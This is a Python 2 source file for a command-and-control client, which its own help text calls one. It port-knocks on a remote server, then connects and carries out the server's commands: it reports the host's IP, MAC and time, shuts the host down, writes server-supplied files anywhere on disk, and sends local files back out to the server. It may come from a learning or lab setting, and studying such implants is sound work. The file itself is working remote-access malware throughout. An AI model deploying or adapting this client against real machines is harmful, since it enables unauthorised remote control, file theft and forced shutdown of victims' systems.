#!/usr/bin/env python2
# Author: Cory Nance
# Date:   15 January 2018

import socket
import subprocess
import netifaces
import time
import argparse
import sys
import os
import hashlib
import base64
from datetime import datetime



def get_iface():
	""" returns the interface that either starts with e or w """
	for iface in netifaces.interfaces():
		if iface[0] in 'we': # starts with w or e
			return iface

def get_mac(socket_connection=None):
	""" 
	returns the mac address of the interface that starts with e or w 
	:param socket_connection: a socket connection with the server
	"""
	iface = get_iface()
	if socket_connection is not None:
		return socket_connection.send(netifaces.ifaddresses(iface)[17][0]['addr'])
	else:
		return netifaces.ifaddresses(iface)[17][0]['addr']

def get_ip(socket_connection=None):
	""" 
	returns the ip address of the interface that starts with e or w 
	:param socket_connection: a socket connection with the server
	"""
	iface = get_iface()
	if socket_connection is not None:
		return socket_connection.send(netifaces.ifaddresses(iface)[2][0]['addr'])
	else:
		return netifaces.ifaddresses(iface)[2][0]['addr']

def get_datetime(socket_connection=None):
	""" 
	returns the current date and time 
	:param socket_connection: a socket connection with the server
	"""
	if socket_connection is not None:
		return socket_connection.send(datetime.now().strftime('%m/%d/%Y %H:%M:%S'))
	else:
		return datetime.now().strftime('%m/%d/%Y %H:%M:%S')

def shutdown_host(socket_connection):
	""" 
	shutdown the host computer 
	:param socket_connection: a socket connection with the server
	"""
	socket_connection.send('OK')
	os.system('shutdown -h now')

def shutdown_client(socket_connection):
	""" 
	shutdown the client application 
	:param socket_connection: a socket connection with the server
	"""
	socket_connection.send('OK')
	sys.exit(0)

def upload(cmd, socket_connection):
	"""
	receives a file from the server and saves it to a specified location
	:param cmd: the original upload command with md5 checksum
	:param socket_connection: a socket connection with the server
	"""
	md5 = hashlib.md5()
	md5sum = cmd.split()[1]
	socket_connection.send('accept')

	path = socket_connection.recv(1024)
	socket_connection.send('ready')

	payload = ''
	while payload[-5:] != '\ndone':
		chunk = socket_connection.recv(1024)
		payload += chunk

	# remove '\ndone'
	payload = payload[:-5]

	# check md5 checksum
	md5.update(payload)
	print 'md5: %s' % md5.hexdigest()
	if md5sum != md5.hexdigest():
		socket_connection.send('invalid checksum')
	else:
		with open(path, 'wb') as out:
			dec_file = base64.b64decode(payload)
			out.write(dec_file)

		socket_connection.send('saved')
		print 'File saved to: %s' % path

def get(orig_cmd, socket_connection):
	"""
	upload a file to the server
	:param orig_cmd: the original cmd
	:param socket_connection: a socket connection with the server
	"""

	local_path = orig_cmd.split()[1]

	with open(local_path, 'rb') as local_file:
		enc_file = base64.b64encode(local_file.read())
		
		# ask server to enter ready states
		md5 = hashlib.md5()
		md5.update(enc_file)
		socket_connection.send(md5.hexdigest())
		
		wait = socket_connection.recv(1024)
		if wait != 'ready':
			print '[*ERROR] Expected %s but received %s' % ('ready', wait)
			return

		socket_connection.send(enc_file)
		socket_connection.send('\ndone')
		
		wait = socket_connection.recv(1024)
		if wait != 'saved':
			print '[*ERROR] Expected %s but received %s' % ('saved', wait)
			return


def run_cmd(cmd, socket_connection):
	""" 
	runs the command specified by cmd and returns the output 
	:param cmd: the command to run
	:param socket_connection: a socket connection with the server
	"""
	if cmd == 'sys_info':
		return socket_connection.send('IP: %s\nMAC: %s\nDate and time: %s' % (get_ip(), get_mac(), get_datetime()))
 	elif cmd == 'get_date':
		return get_datetime(socket_connection)
	elif cmd == 'get_ip':
		return get_ip(socket_connection)
	elif cmd == 'get_mac':
		return get_mac(socket_connection)
	elif cmd == 'shutdown_host':
		return shutdown_host(socket_connection)
	elif cmd == 'shutdown_client':
		return shutdown_client(socket_connection)
	elif cmd.split()[0] == 'upload':
		return upload(cmd, socket_connection)
	elif cmd.split()[0] == 'get':
		return get(cmd, socket_connection)
	return False

def knock(ip, ports, func):
	""" 
	recurively knock on the ports in the port list then call func 
	:param ip: the remote ip address
	:param ports: a list of ports to knock on.  The last port should be the one to ultimately connect to.
	:param func: The function to call after knocking on all but the last port
	"""
	time.sleep(1)
	if len(ports) == 1:
		func(ip, ports[0])

	if len(ports) == 0:
		return

	port = ports[0]
	s = socket.socket()

	try:
		s.connect((ip,  port))
		print "[*INFO] Kocking on %s:%d" % (ip, port)
		s.send('knock knock')	
	except:
		return
	finally:
		s.close()

	knock(ip, ports[1:], func)


def client(ip, port):
	"""
	The main client function.  This function connects to the server and runs commands that are sent to it.
	:param ip: the ip address of the server
	:param port: the port that the server is listening on
	"""
	s = socket.socket()
	print "[*INFO] Connecting on %s:%d" % (ip, port)
	s.connect((ip, port))
	print "[*INFO] Connected to %s:%d" % (ip, port)
	while True:

		cmd = s.recv(1024)
		print 'Received: %s on port %d' % (cmd, port)
		
		if cmd == '':
			print "[*INFO] Terminating session"
			return
		else:
			run_cmd(cmd, s)
	
	s.close()

def main():
	""" creates a socket and waits for connections.  When a connection is initiated the command received is ran and then the output is returned to the server. """
	parser = argparse.ArgumentParser()
	parser.add_argument('--ip', default='', type=str, help='IP address of the C2 server.')
	parser.add_argument('--ports', type=int, nargs='+', default=[53, 80], help='Ports to knock on.')	
	args = parser.parse_args()

	print 'Press ctrl-c to terminate client.'	
		
	try:	
		knock(args.ip, args.ports, client)
	except KeyboardInterrupt:
		print ''

if __name__ == '__main__':
	main()

